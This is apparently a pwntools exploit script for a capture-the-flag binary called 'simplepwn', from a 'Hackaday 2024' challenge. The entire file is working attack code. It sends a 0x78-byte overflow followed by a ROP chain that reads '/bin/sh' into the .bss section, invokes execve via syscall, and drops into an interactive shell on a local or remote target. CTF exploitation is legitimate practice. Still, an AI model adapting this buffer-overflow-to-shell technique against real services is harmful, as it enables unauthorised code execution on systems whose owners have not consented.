#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("simplepwn")

gs = """
b *0x0040119D
b *0x04011A8
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


RDI_RET = 0x000000000040230a
RSI_RET = 0x000000000040499b
RDX_RSP0x28_RET = 0x0000000000404514
RAX_RET = 0x0000000000401001
SYSCALL_RET = 0x404676
RDI_RAX = 0x0000000000404378
p = start()

p.recvuntil(b'Welcome to Hackaday 2024! This is a very simple challenge :)')
p.sendline(
    b'A'*0x78 +
    p64(RSI_RET)+p64(e.bss()+0x100) +
    p64(RDX_RSP0x28_RET) + p64(0x100) + b'\0'*0x28 +
    p64(RAX_RET)+p64(0) +
    p64(RDI_RAX) +
    p64(SYSCALL_RET) +

    p64(RAX_RET)+p64((e.bss()+0x100)) +
    p64(RDI_RAX) +
    p64(RAX_RET)+p64(0x3b) +
    p64(RSI_RET)+p64(0) +
    p64(RDX_RSP0x28_RET)+b'\0'*0x30 +
    p64(SYSCALL_RET)
)

p.send(b"/bin/sh\0")

p.interactive()
